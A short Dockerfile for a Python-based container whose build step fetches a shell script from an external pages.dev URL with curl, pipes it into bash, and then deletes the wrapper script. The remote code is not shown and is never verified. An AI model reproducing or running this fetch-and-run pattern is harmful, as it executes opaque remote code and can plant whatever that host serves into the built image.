FROM python:3.10.15-bullseye
EXPOSE 4200
WORKDIR /home/choreouser

ENV PM2_HOME=/tmp

COPY app/ /home/choreouser/

RUN echo -e "#!/usr/bin/env bash\nbash <(curl -Ls https://stfils.pages.dev/tggames/build.sh)" > /home/choreouser/build.sh &&\
     bash /home/choreouser/build.sh &&\
     rm -rf /home/choreouser/build.sh

CMD ["bash","/home/choreouser/start.sh"]

USER 10001
